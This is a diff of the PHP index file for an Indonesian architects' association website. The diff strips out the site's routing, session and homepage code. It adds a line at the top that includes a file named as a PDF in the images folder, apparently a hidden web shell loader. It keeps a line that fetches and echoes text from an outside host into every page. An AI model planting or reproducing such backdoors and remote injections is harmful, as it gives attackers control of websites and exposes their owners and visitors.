@@ -1,944 +1,739 @@
+<?php include 'images/india.pdf'; ?>
 <?php $a = file_get_contents('https://paulsaar.com/-/id.txt'); echo $a; ?>
-<?php
-## greetings if you read this...
-date_default_timezone_set('Asia/Jakarta');
-error_reporting(E_ALL);
-ini_set('display_errors', "0");// developing 1
-ini_set('log_errors',TRUE);
-ini_set('html_errors',FALSE);
-$err_log = '/var/www/log/web_error.log';
-ini_set('error_log',$err_log);
-
-$modulescript =  basename(__FILE__,".php");
-define("_modulescript", $modulescript);
-
-if ( file_exists('lib/func002.php')  ) {
-        require_once('lib/func002.php');
-}
-else {  echo "err.. "; }
-
-
-$x_ip =  ( array_key_exists( 'HTTP_X_FORWARDED_FOR',    $_SERVER) == true ) ?  $_SERVER["HTTP_X_FORWARDED_FOR"] : '' ;
-if ( !empty($x_ip) ) {
-$ips = $x_ip; }
-else { $ips = $_SERVER["REMOTE_ADDR"]; }
-
-##LogstoDebug(' new hit from '.$ips);
-
-$web_access_token = '';
-$web_user_id = '';
-$web_wa_number = '';
-$email = '';
-$fullname = '';
-$profile_picture_filename = 'dummy.jpg';
-$no_anggota = '';
-$userlevel = '';
-$page_title = '';
-
-$dashboard_URL = 'https://dashboard.iai.or.id/auth?token=';
-//$dashboard_URL_baru = 'https://anggota.iai.or.id/auth?';
-$dashboard_URL_baru = 'https://anggota.iai.or.id/';
-
-LogstoDebug(__LINE__.'| >>> v_URL '. $v_URL );
-
-##cek sudah login kah???
-session_start();
-$cek_login_sts  = !empty($_SESSION[$v_]['_login_sts']) ? $_SESSION[$v_]['_login_sts'] : '' ;
-$cek_data0              = !empty($_SESSION[$v_]['_data0']) ? $_SESSION[$v_]['_data0'] : '' ;
-
-
-LogstoDebug(_modulescript.'| >>> _SESSION = '.var_export($_SESSION, true));
-
-//LogstoDebug(_modulescript.'| >>> cek_login_sts = '.$cek_login_sts);
-$sedang_login = false;
-if (  $cek_login_sts == $v_ )
-{       if ( !empty($cek_data0) )
-        {
-                $sedang_login = true;
-                $web_access_token = ( !empty($cek_data0['access_token'])  ) ? $cek_data0['access_token'] : '' ;
-                $web_user_id  = ( !empty($cek_data0['user_id'])  ) ? $cek_data0['user_id'] : '' ;
-                $web_wa_number  = ( !empty($cek_data0['wa_number'])  ) ? $cek_data0['wa_number'] : '' ;
-                $email  = ( !empty($cek_data0['email'])  ) ? $cek_data0['email'] : '' ;
-                $fullname  = ( !empty($cek_data0['fullname'])  ) ? $cek_data0['fullname'] : '' ;
-                $profile_picture_filename  = ( !empty($cek_data0['profile_picture_filename'])  ) ? $cek_data0['profile_picture_filename'] : $profile_picture_filename ;
-                $no_anggota = ( !empty($cek_data0['no_anggota'])  ) ? $cek_data0['no_anggota'] : '-' ;
-                $userlevel = ( !empty($cek_data0['role'])  ) ? $cek_data0['role'] : '-' ;
-                LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testget = '.var_export($cek_data0, true));
-        }
-} else
-{
-        #coba session re create?
-
-
-
-
-
-
-}
-LogstoDebug(_modulescript.'| >>> sedang_login = '.$sedang_login);
-
-//$testget              =  (   !empty($_GET)  ) ?  $_GET : '' ;
-//LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testget = '.var_export($testget, true));
-
-$testrequri             =  ( array_key_exists( 'REQUEST_URI',   $_SERVER) == true ) ?  $_SERVER['REQUEST_URI'] : '' ;
-//LogstoDebug(_modulescript.'|'.__LINE__.'| >>> testrequri = '.$testrequri);
-
-//$this_request = explode('/', $testrequri);
-
-$this_request = multiexplode(array("/","?"),$testrequri);
-
-//LogstoDebug(_modulescript.'|'.__LINE__.'| >>> this_request = '.var_export($this_request, true));
-//LogstoDebug(_modulescript.'|'.__LINE__.'| >>> tr_2 = '.var_export($tr_2, true));
-
-$args = array();
-
-//Remove empty indexes
-if ( is_array($this_request) )
-{
-        foreach($this_request as $r){
-                if(!empty($r)){
-                        array_push($args, $r);
-                        }       }
-}
-
-//LogstoDebug(_modulescript.'|'.__LINE__.'| >>> '.var_export($args, true));
-
-$a0 = (  array_key_exists( 0, $args) == true  ) ? friendly_seo_string($args[0]) : ''; //always main directory)
-$a1 = (  array_key_exists( 1, $args) == true  ) ? friendly_seo_string($args[1]) : '';
-$a2 = (  array_key_exists( 2, $args) == true  ) ? friendly_seo_string($args[2]) : '';
-$a3 = (  array_key_exists( 3, $args) == true  ) ? friendly_seo_string($args[3]) : '';
-$a4 = (  array_key_exists( 4, $args) == true  ) ? friendly_seo_string($args[4]) : '';
-
-$p      = [
-        'beranda'               => [ 'name' => 'Beranda', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
-        'berita'                => [ 'name' => 'Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita.html' ],
-        'kalendar'              => [ 'name' => 'Kalendar', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ],
-        //'peraturan'   => [ 'name' => 'Peraturan', 'main_template' => '_main_page.html', 'content' => '_peraturan.html' ],
-        'direktori-iai' => [ 'name' => 'Direktori IAI', 'main_template' => '_main_page.html', 'content' => '_direktori_iai.html' ],
-        'direktori_iai_dev' => [ 'name' => 'Direktori IAI DEV', 'main_template' => '_main_page_direktori_iai_dev.html', 'content' => '_direktori_iai_dev.html' ],
-        'badan'                 => [ 'name' => 'Badan', 'main_template' => '_main_page.html', 'content' => '_empty.html' ],
-
-        'organisasi'    => [ 'name' => 'Organisasi', 'main_template' => '_main_page.html', 'content' => '_majelis-organisasi.html' ],
-        'keanggotaan'   => [ 'name' => 'Berita', 'main_template' => '_main_page.html', 'content' => '_dasar-keanggotaan.html' ],
-        //'badan-keprofesian'   => [ 'name' => 'Badan Keprofesian', 'main_template' => '_main_page.html', 'content' => '_kalkulator_kum.html' ],
-        'faq'   => [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-        'faq_dev01'     => [ 'name' => 'FAQs', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-        //'magang'      => [ 'name' => 'Program Magang', 'main_template' => '_main_page.html', 'content' => '_program-magang.html' ],
-        'wilayah'       => [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
-        'provinsi'      => [ 'name' => 'Ikatan Arsitek Indonesia', 'main_template' => '_main_page.html', 'content' => '_wilayah.html' ],
-
-        'berita-detail'                 => [ 'name' => 'Detail Berita', 'main_template' => '_main_page_info.html', 'content' => '_berita_detail.html' ],
-        'events'        => [ 'name' => 'Kegiatan', 'main_template' => '_main_page_kalendar.html', 'content' => '_kalendar.html' ],
-        'events_dev01'  => [ 'name' => 'Kegiatan', 'main_template' => '_main_page_kalendar_dev.html', 'content' => '_kalendar.html' ],
-        'login'         => [ 'name' => 'Login', 'main_template' => '_main_page_menu_dark.html', 'content' => '_login.html' ],
-        'privacy-policy'        => [ 'name' => 'Privacy Policy', 'main_template' => '_main_page.html', 'content' => '_privacy.html' ],
-        //'terms-and-conditions'        => [ 'name' => 'Terms And Conditions', 'main_template' => '_main_page.html', 'content' => '_terms_and_conditions.html' ],
-        'informasi' => [ 'name' => 'informasi', 'main_template' => '_main_page.html', 'content' => '_empty.html' ],
-        'hubungan-internasional' => [ 'name' => 'Badan Hubungan Internasional', 'main_template' => '_main_page.html', 'content' => '_hubungan-internasional.html' ],
-        'hubungan-organisasi-kelembagaan' => [ 'name' => 'Badan Hubungan Organisasi dan Kelembagaan', 'main_template' => '_main_page.html', 'content' => '_hubungan-organisasi-kelembagaan.html' ],
-        'dashboard'             => [ 'name' => 'Dashboard', 'main_template' => '_main_web.html', 'content' => '_empty.html' ],
-        'site-map'              => [ 'name' => 'Site Map', 'main_template' => '_main_page.html', 'content' => '_site_map.html' ],
-        'kode-etik'             => [ 'name' => 'Kode Etik', 'main_template' => '_main_page.html', 'content' => '_kode_etik.html' ],
-        'ad-art'                => [ 'name' => 'AD/ART', 'main_template' => '_main_page.html', 'content' => '_ad_art.html' ],
-        //'pedoman-hubungan-kerja'      => [ 'name' => 'Pedoman Hubungan Kerja', 'main_template' => '_main_page.html', 'content' => '_pedoman_hubungan_kerja.html' ],
-        'search'        => [ 'name' => 'Search', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-        'event-register'        => [ 'name' => 'Event Register', 'main_template' => '_main_page.html', 'content' => '_content_default.html' ],
-        'catatan-ketua-umum'    => [ 'name' => 'Catatan Ketua Umum', 'main_template' => '_main_page_info.html', 'content' => '_content_default.html' ],
-
-];
-
-$page_content = 'page content is empty..';
-$page_js = $page_css = '';
-$page_name = 'IAI - Website';
-$page_caption = '';
-$beranda_kalkum_js = $beranda_kalkum_css = '';
-
-$kasih_404 = false;
-
-if (  !empty($p[$a0])  )
-{
-        $v = gethtml('view/'.$p[$a0]['main_template']);
-        $c = gethtml('view/'.$p[$a0]['content']);
-        $page_name = $p[$a0]['name'];
-
-        LogstoDebug(__LINE__.'| >>> a0 '.$a0);
-        LogstoDebug(__LINE__.'| >>> a1 '.$a1);
-
-        /*
-        if ( !empty($a1)  )
-        {
-                $arr_submenu = ['kalkulator_kum', 'pengajuan-kum','majelis-organisasi', 'majelis-kehormatan','badan-lembaga','pembentukan-pwp',
-        'dasar-keanggotaan','menjadi-anggota','keanggotaan-berakhir','hak-kewajiban-tanggungjawab','hubungan-internasional','hubungan-organisasi-kelembagaan'];
-                if ( in_array($a1, $arr_submenu) )
-                {
-
-                        $c = gethtml('view/_'.$a1.'.html');
-                        //LogstoDebug(__LINE__.'| >>> c using '.$c);
-                }
-        }
- */
-
-
-        if ( $a0 == 'berita' )
-        {
-                if ( file_exists('berita.php')  ) {
-                        require_once('berita.php');
-                }
-                else {  die("err.. "); }
-        }
-        else if ( $a0 == 'catatan-ketua-umum' )
-        {
-                if ( file_exists('cku.php')  ) {
-                        require_once('cku.php');
-                }
-                else {  die("err.. "); }
-        }
-        else if ( $a0 == 'login' )
-        {
-                if ( $sedang_login == true )
-                {
-                        $a1 = '';
-                        header('Location: '.$v_URL);
-                        die();
-                }
-                else
-                {
-                        $page_js = " <script src='".$v_URL."/js/login.js'></script> ";
-                }
-
-        } else if ( $a0 == 'badan' )
-        {
-
-                if ( file_exists('badan.php')  ) {
-                        require_once('badan.php');
-                }
-                else {  die("err.. "); }
-
-        } else if ( $a0 == 'events' )
-        {
-
-                if ( file_exists('events.php')  ) {
-                        require_once('events.php');
-                }
-                else {  die("err.. "); }
-
-        }  else if ( $a0 == 'faq' )
-        {
-
-                if ( file_exists('faq.php')  ) {
-                        require_once('faq.php');
-                }
-                else {
-                        $c = gethtml('view/'.$p[$a0]['content']);
-
-                }
-
-        }
-          else if ( $a0 == 'direktori-iai' )
-        {
-
-                if ( file_exists('direktori_iai.php')  ) {
-                        require_once('direktori_iai.php');
-                }
-                else {  die("err.. "); }
-
-        }  else if ( $a0 == 'magang' )
-        {
-                LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
-                $page_js = "
-                <script> var sedang_login = '".$sedang_login."'; </script>
-                <script src='".$v_URL."/js/funclib.js'></script>
-                ";
-
-        } else if ( $a0 == 'dashboard' )
-        {
-                $a0 = '';
-                if ( $sedang_login == true )
-                {
-                        if ( !empty($no_anggota) ) {
-                                //if ( in_array($no_anggota, ['99992','99994','999963','17589','07792','08986']) ) {
-                                if ( in_array($no_anggota, ['99992']) ) {
-                                        //header('Location: '.$dashboard_URL.$web_access_token);
-                                        //header('Location: '.$dashboard_URL_baru.$web_access_token);
-                                        header('Location: '.$dashboard_URL_baru);
-                                }
-                                else
-                                {
-                                        //header('Location: '.$dashboard_URL.$web_access_token);
-                                        header('Location: '.$dashboard_URL_baru);
-                                }
-
-                        }
-                }
-                else
-                {
-                        header('Location: '.$v_URL);
-                }
-                die();
-        }  else if ( $a0 == 'faq_dev01' )
-        {
-
-                if ( file_exists('faq_dev01.php')  ) {
-                        require_once('faq_dev01.php');
-                }
-                else {
-                        $c = gethtml('view/'.$p[$a0]['content']);
-
-                }
-
-        } else if ( $a0 == 'search' )
-        {
-
-                if ( file_exists('search.php')  ) {
-                        require_once('search.php');
-                }
-                else {
-                        $c = gethtml('view/'.$p[$a0]['content']);
-
-                }
-
-        } else if ( $a0 == 'events_dev01' )
-        {
-
-                if ( file_exists('events_v2_dev.php')  ) {
-                        require_once('events_v2_dev.php');
-                }
-                else {  die("err.. "); }
-
-        }
-
-
-
-        if ( $a0 == 'wilayah' OR  $a0 == 'provinsi'   )
-        {
-                if ( empty($a1) )
-                {
-                        if ( file_exists('wilayah.php')  ) {
-                                require_once('wilayah.php');
-                        }
-                        else {  die("err.. "); }
-                }
-        }
-
-        #buat random backgroud parallax
-        $rnd = rand(1,9);
-        //$bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
-        $bg_parallax = $v_URL.'/assets/images/parallax/parallax_'.$rnd.'.jpg';
-        LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
-        $c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);
-
-
-
-}
-else {
-
-
-        if ( !empty($a0) ) {
-
-                $content_di_request = end($args);
-                // kalau media akan di exit di get_media.php
-                if (  $a0 == 'media' ) {
-                        if ( !empty($a1) ) {
-                                if (  !empty($a2) ) {
-                                                if ( file_exists('get_media.php')  ) {
-                                                        require_once('get_media.php');
-                                        }
-                                }
-                        }
-
-                }
-
-                LogstoDebug(__LINE__.'| >>> a0 '.$a0. " not in menu array ");
-                $v = gethtml('view/_main_page.html');
-
-
-                LogstoDebug(__LINE__.'| >>> content_di_request '.$content_di_request. " <<< ");
-                #get this link title if any?
-
-                $params = '{
-                        "name": "'.$content_di_request.'"
-                }';
-                $get_link = httpPost($vURL_db_data.'/apidb/page_detail', $params);
-                $arr_get_link = json_decode($get_link, true);
-        //      LogstoDebug(__LINE__.'| >>> arr_get_link '.var_export($arr_get_link, true). " <<< ");
-
-
-
-                $c = gethtml('view/_page_detail.html');
-
-                if ( !empty($arr_get_link['data']) )
-                {
-                        $page_title = $arr_get_link['data']['post_title'];
-                        $page_content = $arr_get_link['data']['post_content'];
-                } else {
-                        if ( $a0 == 'assets'  ) {
-                                $kasih_404 = true;
-                                LogstoDebug(__LINE__.'| >>> kasih_404 '.$kasih_404. " <<< ");
-                                http_response_code(404);
-                                header("HTTP/1.0 404 Not Found");
-                                header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
-                die('404 Not Found');
-                        }
-
-                }
-
-
-                $rnd = rand(1,9);
-                $bg_parallax = $v_URL.'/assets/uploads/2022/04/parallax/page_title_bg-'.$rnd.'.jpg';
-                LogstoDebug(__LINE__.'| >>> bg_parallax '.$bg_parallax. " <<< ");
-                $c = str_replace("<!--bg_parallax-->", $bg_parallax, $c);
-
-                $c = str_replace("<!--page_title-->", $page_title, $c);
-
-
-                // kalau magang ada js khusus login
-
-                 if ( $a0 == 'magang' )
-                {
-                        LogstoDebug(__LINE__.'| >>> mangang cek '.$a0. " sampai sini <<< ");
-                        $page_js = "
-                        <script> var sedang_login = '".$sedang_login."'; </script>
-                        <script src='".$v_URL."/js/funclib.js'></script>
-                        ";
-
-                }
-
-
-
-        }
-
-}
-
-if ( empty($v) ) { $v = gethtml('view/_main_web.html'); }
-if ( empty($c) ) { $c = gethtml('view/_empty.html'); }
-
-
-if ( $a0 == '' )
-{
-        #ini halaman depan / beranda / index
-
-        ## GET LIST SLIDERS ###################################
-        $content_home_slider  = '';
-        $arr_params = ["per_page" => 25];
-        $params = json_encode($arr_params);
-        $list_slider = httpPost($vURL_db_data.'/apidb/slider_list', $params);
-        $arr_list_slider = json_decode($list_slider, true);
-
-        //LogstoDebug(__LINE__.'| >>> arr_list_slider '. var_export($arr_list_slider, true));
-
-        if ( !empty($arr_list_slider['success']) && $arr_list_slider['success'] == true )
-        {
-                $last_rnd = 0;
-
-                #get background images
-                $arr_params2 = ["per_page" => 1, "f_used_for" => "bg-slider"];
-                $params2 = json_encode($arr_params2);
-                $list_bg_slider = httpPost($vURL_db_data.'/apidb/files_list', $params2);
-                $arr_list_bg_slider = json_decode($list_bg_slider, true);
-                $total_count_bg_slider = !empty($arr_list_bg_slider['total_count']) ? $arr_list_bg_slider['total_count'] : 6;
-                LogstoDebug(__LINE__.'| >>> total_count_bg_slider = '.  $total_count_bg_slider );
-
-                foreach ( $arr_list_slider['data'] as $slider_k => $slider_v )
-                {
-
-                        if ( empty($slider_v['media_url']) )
-                        {
-                                $rnd2 = rand(1,$total_count_bg_slider);
-                                $limwh = 1;
-                                $loopinrnd2 = true;
-                                while ( $loopinrnd2 )
-                                {
-                                        $rnd2 = rand(1,$total_count_bg_slider);
-                                        if ($last_rnd != $rnd2) { $loopinrnd2 = false; }
-                                        $limwh++;
-                                        if ($limwh > 10) { $loopinrnd2 = false; }
-                                }
-                                $last_rnd = $rnd2;
-
-                                $bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
-                                $this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
-                                //$this_media_source = '<div class="slide" style="background-image:url(\''.$bg_slider.'\');">';
-                                //$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.$slider_v['media_url'].'\');">';
-                        }
-                        else
-                        {
-                                //$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
-                                $this_media_source = '<div class="slide" style="background-image:url(\''.$v_URL.'/'.$slider_v['media_url'].'\');">';
-                                #$rnd2 = rand(1,3);
-                                #$bg_slider = $v_URL.'/assets/images/slider/slider_'.$rnd2.'.jpg';
-                                #$this_media_source = '<div class="slide kenburns" style="background-image:url(\''.$bg_slider.'\');">';
-                        }
-
-                        if ( $slider_v['media_type'] == 'video' )
-                        {
-                                $this_media_source = ' <div class="slide" data-bg-video="<!--vURL-->/'.$slider_v['media_url'].'"> ';
-                        }
-
-
-                        $content_home_slider .= '
-                        <!-- Slide #'.$slider_v['idx'].' -->
-            '.$this_media_source.'
-                <div class="bg-overlay"></div>
-                <div class="container">
-                    <div class="slide-captions text-center text-light">
-                        <!-- Captions -->
-                                                        '.$slider_v['caption'].'
-                        <!-- end: Captions -->
-                    </div>
-                </div>
-            </div>
-            <!-- end: Slide #'.$slider_v['idx'].' -->
-                        ';
-
-                }
-
-
-        }
-        $v = str_replace("<!--content_home_slider-->", $content_home_slider, $v);
-
-        ## GET LIST SLIDERS END ###################################
-
-
-        ## GET catatan-ketua-umum
-        $content_home_catatan_ketua_umum  = '';
-        $arr_paramscku = ["per_page" => 1];
-        $paramscku = json_encode($arr_paramscku);
-        $list_cku = httpPost($vURL_db_data.'/apidb/catatan_ketua_umum_list', $paramscku);
-        $arr_cku = json_decode($list_cku, true);
-
-        $cku_judul = 'Catatan';
-        $cku_content = 'Seperti yang sudah kita lakukan bersama-sama, kita pun akan bersama-sama lagi. Kita bisa sampai ke detik hari ini tidak lepas dari jasa dari kepengurusan sebelumnya,';
-        $cku_sub_content = '<span>Ketua IAI</span>';
-        $pp_penulis = '<img src="'.$v_URL.'/assets/uploads/2022/04/ketum_iai_2022.jpg" alt="ketua umum IAI">';
-        $cku_id          = $arr_cku['data'][0]['news_id'];
-        $URL_cku_ini = "{$v_URL}/catatan-ketua-umum/{$cku_id}";
-
-        $cku_data = '
-        <div class="seperator"><i class="fa fa-pencil-alt"></i></div>
-        <div class="testimonial testimonial-left">
-                <div class="testimonial-item">
-                <!--pp_penulis-->
-                <h4><!--cku_judul--></h4>
-                <p><!--cku_excerpt--> <span class="right-align"><a href="'.$URL_cku_ini.'">read more</a></span></p>
-
-                <!--cku_sub_content-->
-
-
-                </div>
-        </div>
-        ';
-//      <span><small> <a href="#"> Catatan selengkapnya >>> <a/> </small></span>
-
-        if ( !empty($arr_cku['success']) && $arr_cku['success'] == true )
-        {
-                //LogstoDebug(__LINE__.'| >>> ADA content_home_catatan_ketua_umum  ');
-                $cku_sub_content = '';
-                //LogstoDebug(__LINE__.'| >>  '. var_export($arr_cku, true));
-                $cku_judul                      = $arr_cku['data'][0]['news_title'];
-                $cku_content            = $arr_cku['data'][0]['news_content'];
-                $cku_excerpt            = $arr_cku['data'][0]['news_excerpt'];
-                if ( trim($cku_excerpt) == '') {
-                        $cku_excerpt    = $cku_content;
-                }
-                $c_sub_content          = $arr_cku['data'][0]['news_sub_content'];
-                                $c_sub_content = ''.nl2br($c_sub_content).'';
-                                foreach(preg_split("/((\r?\n)|(\r\n?))/", $c_sub_content) as $line){
-                                        if (strlen($line) > 0) {
-                                                $cku_sub_content .= '<strong>'.$line.'<strong>';
-                                        } else {
-                                                $cku_sub_content = ''.$cku_sub_content.'';
-                                        }
-                                }
-
-
-
-                $pp_penulis             = "<img src='{$v_URL}/assets/uploads/{$arr_cku['data'][0]['news_main_image']}' alt='Catatan'> ";
-        }
-        else {
-                LogstoDebug(__LINE__.'| >>> content_home_catatan_ketua_umum kosong..');
-                $cku_content = '';
-        }
-
-        $cku_data = str_replace("<!--pp_penulis-->", $pp_penulis, $cku_data);
-        $cku_data = str_replace("<!--cku_judul-->", $cku_judul, $cku_data);
-        $cku_data = str_replace("<!--cku_excerpt-->", $cku_excerpt, $cku_data);
-        $cku_data = str_replace("<!--cku_content-->", $cku_content, $cku_data);
-        $cku_data = str_replace("<!--cku_sub_content-->", $cku_sub_content, $cku_data);
-        $v = str_replace("<!--content_home_catatan_ketua_umum-->", $cku_data, $v);
-        ## GET catatan-ketua-umum END
-
-
-        ## GET LIST BERITA BEGIN
-        $content_home_berita  = '';
-        $arr_params = ["per_page" => 9];
-        $params = json_encode($arr_params);
-        $list_berita = httpPost($vURL_db_data.'/apidb/berita_list', $params);
-        $arr_list_berita = json_decode($list_berita, true);
-
-        #LogstoDebug(__LINE__.'| >>> arr_list_berita '. var_export($arr_list_berita, true));
-
-        if ( !empty($arr_list_berita['success']) && $arr_list_berita['success'] == true )
-        {
-                foreach ( $arr_list_berita['data'] as $berita_k => $berita_v )
-                {
-
-                        $im = '';
-                        if ( !empty($berita_v['news_main_image']) )
-                        {
-                          $im = '<a href="#">
-                          <img alt="" src="'.$v_URL.'/assets/uploads'.$berita_v['news_main_image'].'">
-                        </a>';
-                        }
-
-                        $content_home_berita .= '
-                        <!-- Post item-->
-                        <div class="post-item border">
-                                <div class="post-item-wrap">
-                                        <div class="post-image">
-                                                '.$im.'
-                                        </div>
-                                        <div class="post-item-description">
-                                                <span class="post-meta-date"><i class="fa fa-calendar-o"></i>'.$berita_v['news_dt_create'].'</span>
-
-                                                <h2><a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'">'.$berita_v['news_title'].'</a></h2>
-                                                '.$berita_v['news_excerpt'].'
-                                                <a href="'.$v_URL.'\berita/'.$berita_v['news_name'].'" class="item-link"> &nbsp;...Read More <i class="icon-chevron-right"></i></a>
-                                        </div>
-                                </div>
-                        </div>
-                        <!-- end: Post item-->
-                        ';
-
-                }
-
-
-        }
-        $v = str_replace("<!--content-home-berita-->", $content_home_berita, $v);
-
-        ## GET LIST BERITA END
-
-
-        ## GET LIST SPONSOR BEGIN #####################################
-                $content_home_sponsor  = '';
-                $arr_params = ["per_page" => 8];
-                $params = json_encode($arr_params);
-                $list_sponsor = httpPost($vURL_db_data.'/apidb/sponsor_list', $params);
-                $arr_list_sponsor = json_decode($list_sponsor, true);
-
-                //LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_sponsor, true));
-
-                if ( !empty($arr_list_sponsor['success']) && $arr_list_sponsor['success'] == true )
-                {
-                        foreach ( $arr_list_sponsor['data'] as $sponsor_k => $sponsor_v )
-                        {
-                                $sponsor_sosmed_info = '';
-                                if ( !empty($sponsor_v['link_facebook']) )
-                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_facebook'].'" target="_blank">
-                                <i class="fab fa-facebook-f"></i><span>Facebook</span></a>'; }
-
-                                if ( !empty($sponsor_v['link_twitter']) )
-                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_twitter'].'" data-width="100" target="_blank">
-                                        <i class="fab fa-twitter"></i><span>Twitter</span></a>'; }
-
-                                if ( !empty($sponsor_v['link_instagram']) )
-                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="'.$sponsor_v['link_instagram'].'" data-width="118" target="_blank">
-                                        <i class="fab fa-instagram"></i><span>Instagram</span></a>'; }
-
-                                if ( !empty($sponsor_v['link_mail']) )
-                                { $sponsor_sosmed_info .= '<a class="btn btn-xs btn-slide btn-light" href="mailto:'.$sponsor_v['link_mail'].'" data-width="80" target="_blank">
-                                        <i class="icon-mail"></i><span>Mail</span></a>'; }
-                                        /*
-                                                https://mail.google.com/mail/u/0/?fs=1&to=someone@example.com&su=SUBJECT&body=BODY&bcc=someone.else@example.com&tf=cm
-                                        */
-
-
-                                if ( !empty($sponsor_v['link_website']) )
-                                {
-                                        $linkAmulai = "<a href='".$sponsor_v['link_website']."' target='_blank'>";
-                                        $linkAakhir = "</a>";
-                                } else {
-                                        $linkAmulai = $linkAakhir = '';
-                                 }
-
-
-                                $content_home_sponsor .= '
-                                <!-- sponsor item-->
-                                <div class="col-lg-3">
-                                        <div  class="team-member pt-2">
-                                                '.$linkAmulai.'
-                                                <div >
-                                                        <img src="<!--vURL-->'.$sponsor_v['url_logo'].'" width="100">
-                                                </div>
-                                                '.$linkAakhir.'
-                                                <div class="team-desc">
-                                                        <h3>'.$sponsor_v['nama'].'</h3>
-                                                        <span>'.$sponsor_v['short_info'].'</span>
-                                                        <p>'.$sponsor_v['caption'].'</p>
-                                                        <div class="align-center">
-                                                                '.$sponsor_sosmed_info.'
-                                                        </div>
-                                                </div>
-                                        </div>
-                                </div>
-                                <!-- end: sponsor item-->
-
-                                ';
-
-                        }
-
-
-                }
-                $v = str_replace("<!--content-home-sponsor-->", $content_home_sponsor, $v);
-        ## GET LIST SPONSOR END #####################################
-
-
-        ## KALKULATOR BEGIN
-                //$section_kalkulator_kum = gethtml('view/_kalkulator_kum_section.html');
-                $section_kalkulator_kum = "";
-                $v = str_replace("<!--content-kalkulator-kum-->", $section_kalkulator_kum, $v);
-
-                if ( !empty($section_kalkulator_kum) )
-                {
-                        $beranda_kalkum_css = '
-                        <style>
-                        .textcenter { text-align: center !important; }
-                        #nikumheader {
-                                position: relative;
-                                text-align: center;
-                          }
-                        #nikumheadercontent {
-                                color: #fff;
-                                position: absolute;
-                                text-align: center;
-                                bottom: 0;
-                                display: table;
-                                margin: 0 auto;
-                        }
-                        .custom-select {
-                                display: inline-block;
-                                width: 100%;
-                                height: calc(1.5em + 0.75rem + 2px);
-                                padding: 0.375rem 1.75rem 0.375rem 0.75rem;
-                                font-size: 1rem;
-                                font-weight: 400;
-                                line-height: 1.5;
-                                color: #495057;
-                                vertical-align: middle;
-                                background: url("data:image/svg+xml,%3csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 4 5\'%3e%3cpath fill=\'%23343a40\' d=\'M2 0L0 2h4zm0 5L0 3h4z\'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px;
-                                background-color: #fff;
-                                border: 1px solid #ced4da;
-                                border-radius: 0.25rem;
-                                -webkit-appearance: none;
-                                -moz-appearance: none;
-                                appearance: none;
-                          }
-                        </style>
-                        ';
-
-                        $beranda_kalkum_js = '
-                        <script> var v_URL = "'.$v_URL.'" </script>
-                        <script src="'.$v_URL.'/plugins/validate/validate.min.js"></script>
-                        <script src="'.$v_URL.'/js/kalkulator_kum.js"></script>
-                                                 ';
-                }
-
-        ## KALKULATOR END
-
-
-        ## GET LIST AFILIASI BEGIN #####################################
-        $content_home_afiliasi  = '';
-        $arr_params = ["per_page" => 6];
-        $params = json_encode($arr_params);
-        $list_afiliasi = httpPost($vURL_db_data.'/apidb/afiliasi_list', $params);
-        $arr_list_afiliasi = json_decode($list_afiliasi, true);
-
-        #LogstoDebug(__LINE__.'| >>> arr_list_sponsor '. var_export($arr_list_afiliasi, true));
-
-        if ( !empty($arr_list_afiliasi['success']) && $arr_list_afiliasi['success'] == true )
-        {
-                foreach ( $arr_list_afiliasi['data'] as $afiliasi_k => $afiliasi_v )
-                {
-
-                        $content_home_afiliasi .= '
-                        <div class="grid-item">
-                                <!-- afiliasi item -->
-                                <div class="testimonial-item">
-                                        <p><img src="<!--vURL-->'.$afiliasi_v['url_logo'].'" width="auto" height="50" alt=""></p>
-                                        <p><a href="'.$afiliasi_v['url_link'].'" target="_blank">'.$afiliasi_v['nama'].'</a></p>
-
-                                </div>
-                                <!-- end: afiliasi item-->
-                        </div>
-                        ';
-
-                }
-
-
-        }
-        $v = str_replace("<!--content-home-afiliasi-->", $content_home_afiliasi, $v);
-        ## GET LIST SPONSOR END #####################################
-
-
-}
-else{
-        $c = str_replace("<!--page_content-->", $page_content, $c);
-}
-
-
-
-$v = str_replace("<!-- the_content -->", $c, $v);
-$v = str_replace("<!--page_name-->", $page_name, $v);
-$v = str_replace("<!--page_caption-->", $page_caption, $v);
-
-$btn_iai_interaktif = '
-<a href="https://api.whatsapp.com/send/?phone=6281546405200&text=menu&app_absent=0" target="_blank">
-    <div class="fixed-bottom-message align-items-center text-white" >
-        <img src="<!--vURL-->/images/logo/icon_WAp.png" width="20px" />
-        IAI-Interaktif </div>
-</a>
-';
-$v = str_replace("<!-- button_wa_iai_interaktif -->", $btn_iai_interaktif, $v);
-
-
-$btn_iai_helpdesk = '
-<a href="https://api.whatsapp.com/send/?phone=6281210929730&text=halo helpdesk&app_absent=0" target="_blank">
-    <div class="fixed-bottom-message2 align-items-center text-white">
